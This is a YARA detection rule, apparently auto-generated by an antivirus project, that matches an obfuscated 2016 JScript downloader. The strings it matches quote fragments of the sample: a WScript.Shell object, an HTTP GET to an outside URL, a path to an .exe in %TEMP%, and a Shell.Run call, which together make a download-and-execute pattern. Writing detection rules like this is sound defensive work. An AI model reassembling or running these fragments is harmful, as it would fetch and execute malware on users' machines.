rule sig_20160328_8cc5ace75a18e50b389e808bc4e15293 {
  meta:
    description = "datamaliciousorder - file 20160328_8cc5ace75a18e50b389e808bc4e15293.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "130f490863e655daa5542610101589b5afb7c1307604856fe47e7737bf23d512"

  strings:
    $s1  = "function Baytm() {return Ssonnxw[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"lnlPqnEQwm.exe\";};" fullword ascii
    $s2  = "Qkdlkgp[Ibnjwl](\"GET\", \"http://bombers-original.com/mdj6sf\", false);" fullword ascii
    $s3  = "do {WScript[Ifhcm](Xwxduq() * 11)} while (Qkdlkgp[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Giwvdnpxof(Guayo, Argndklt){return Guayo - Argndklt;};" fullword ascii
    $s5  = "var Ssonnxw = function Kwlrftxgom() {return WScript[Udwzupxbwy](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Wubtbguxqr() {return ((Ndscbxji == true) && (Ndscbxji == Ztkxtzx)) ? 1 : Ssjyo;};" fullword ascii
    $s7  = "function Bfxcgp(Ouzizzap){Ssonnxw[\"Run\"](Ouzizzap, Ssjyo, Ssjyo);};" fullword ascii
    $s8  = "Ndscbxji = true; " fullword ascii
    $s9  = "Ztkxtzx = true; " fullword ascii
    $s10 = "return Giwvdnpxof(Xhznsgob, Kjuttbn);" fullword ascii
    $s11 = "function Rqkvgrttl(){return Udwzupxbwy;};" fullword ascii
    $s12 = "function Wkhxaqsaeh(){return Eihjskt;};" fullword ascii
    $s13 = "var Prdoqes = false;" fullword ascii
    $s14 = "function Kvvnqd()" fullword ascii
    $s15 = " while (Dffgwk){" fullword ascii
    $s16 = "var Ztkxtzx = false;" fullword ascii
    $s17 = "function Tafmvgb(Jmhgonvwqf) {var Inrbvljeh = (1, 2, 3, 4, 5, Jmhgonvwqf); return Inrbvljeh;};" fullword ascii
    $s18 = "var Krnawai = new this[\"Date\"]();" fullword ascii
    $s19 = "var Ndscbxji = false;" fullword ascii
    $s20 = "function Xwxduq(){return 22;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}